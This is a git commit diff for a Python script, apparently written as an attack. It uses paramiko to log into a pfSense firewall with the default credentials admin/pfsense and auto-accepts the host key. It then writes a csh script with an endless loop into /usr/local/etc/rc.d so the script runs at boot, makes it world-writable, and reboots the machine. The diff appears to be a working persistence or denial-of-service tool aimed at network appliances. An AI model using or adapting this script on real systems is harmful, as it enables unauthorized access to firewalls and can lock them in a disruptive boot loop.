7a0906f1c0934978f28431d5f357a483ef17518a
Blake <80996688+BlakeTnr@users.noreply.github.com>
2024-03-02 09:02:25 -0500

    Update and rename paramiko.py to paratest.py

--- blakeshit/paratest.py
+++ blakeshit/paratest.py
@@ -1,3 +1,5 @@
+import paramiko
+
 fuckshitscript = """
 #!/bin/csh
 while (1 <= 1)
@@ -14,14 +16,9 @@ host = ""
 username = "admin"
 password = "pfsense"
 
-client = SSHClient()
+client = paramiko.client.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 client.connect(host, username=username, password=password)
 client.exec_command(commandforwriting + " > /usr/local/etc/rc.d/ctsh.sh")
 client.exec_command("chmod 777 /usr/local/etc/rc.d/ctsh.sh")
-
-# write file
-/usr/local/etc/rc.d
-(echo "line1"; echo "line2") > /usr/local/etc/rc.d/ctsh.sh
-chmod 777 /usr/local/etc/rc.d/ctsh.sh
-client.exec_command("")
+client.exec_command("reboot")
